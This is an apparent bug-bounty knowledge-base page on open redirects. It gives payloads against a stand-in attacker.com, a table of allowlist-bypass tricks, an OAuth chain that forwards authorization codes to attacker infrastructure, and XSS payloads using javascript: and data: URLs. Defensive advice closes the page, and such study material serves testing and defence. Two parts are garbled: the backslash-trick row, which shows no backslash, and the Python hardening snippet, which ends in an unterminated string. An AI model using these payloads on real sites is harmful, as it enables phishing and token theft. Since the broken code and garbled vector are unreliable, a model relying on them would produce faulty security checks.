---
title: Open Redirect Vulnerabilities & Allowlist Bypass Techniques
created: 2026-09-24
updated: 2026-09-24
type: concept
tags:
  - open-redirect
  - bug-bounty
  - payload
sources:
  - unprocessed-obsidians/open-redirect.md
confidence: high
contested: false
contradictions: []
---

# Open Redirect Vulnerabilities & Allowlist Bypass Techniques

## Overview
An Open Redirect occurs when a web application accepts untrusted user input as a destination URL and issues an HTTP redirect (e.g. `302 Found`, `301 Moved Permanently`) without validating that the target belongs to a trusted domain. While frequently triaged as low severity in isolation, open redirects serve as critical primitives in complex exploitation chains, notably enabling OAuth authorization code exfiltration, token leakage, and phishing bypasses.

## Primary Implementation Patterns
- **Query Parameter Redirects**: `GET /login?redirect_uri=https://attacker.com`
- **Path-Based Redirects**: `GET /redirect/https://attacker.com`
- **Referer-Based Redirects**: Applications reading `HTTP_REFERER` and automatically issuing a redirect back to the originating domain.
- **JavaScript Client-Side Redirects**: `window.location.href = location.search.split('url=')[1]`

## Allowlist & Regex Bypass Taxonomy

When an application enforces a domain allowlist (e.g. attempting to match `trusted.com`):

| Filter Constraint | Bypass Vector | Parser / Browser Mechanism |
| :--- | :--- | :--- |
| **Prefix Matching** (`starts with https://trusted.com`) | `https://trusted.com.attacker.com` | Attacker registers subdomain of attacker domain. |
| **Substring Matching** (`contains trusted.com`) | `https://attacker.com?data=trusted.com` | `trusted.com` appears in query string. |
| **Protocol-Relative Slashes** | `//attacker.com` | Browser treats `//` as scheme-relative URL using current protocol. |
| **Backslash Tricks** | `https://trusted.comttacker.com` or `https://trusted.com/ttacker.com` | Chrome/Firefox normalize `\` to `/` in authority parsing, treating `attacker.com` as host. |
| **Userinfo / Credential Abuse** | `https://trusted.com@attacker.com` | URL specification treats string before `@` as username/password, connecting to `attacker.com`. |
| **Question Mark & Hash Exploitation** | `https://trusted.com?@attacker.com` or `https://trusted.com#@attacker.com` | Causes server-side URL regex to misidentify authority segment. |
| **Unicode & Dot Normalization** | `https://trusted。com` (fullwidth dot `。`) | Normalized by IDN/browser parsers to standard ASCII dot `.`. |

## Critical Chaining Escalations

### 1. OAuth Authorization Code Exfiltration
As detailed in [[oauth-attack-vectors]], when an OAuth authorization server enforces loose `redirect_uri` validation (e.g. allowlisting `https://client.com/*`), chaining an open redirect on `client.com` forwards the sensitive authorization code directly to attacker infrastructure:
```text
https://auth.com/authorize?client_id=123&redirect_uri=https://client.com/oauth/callback?next=https://attacker.com
```

### 2. Escalation to XSS via JavaScript Schemes
If the application forwards the redirect URL to client-side DOM handlers (`window.location = url` or `<meta http-equiv="refresh" content="...">`):
```text
url=javascript:alert(document.domain)
url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

## Defensive Hardening
1. **Avoid External Redirection**: Avoid user-controlled redirection parameters; rely on static routes or stateful session lookups.
2. **Relative Path Enforcement**: If redirects are necessary, enforce that URLs begin with a single `/` and NOT `//` or `/\`:
   ```python
   if url.startswith('/') and not url.startswith('//') and not url.startswith('/\'):
       return redirect(url)
   ```
3. **Strict Domain Whitelisting**: Parse target URLs using robust standard URL libraries, extracting the `hostname` component and comparing against a strict exact-match whitelist.

## Related Pages
- [[open-redirect]]
- [[cross-site-scripting]]
- [[oauth-attack-vectors]]
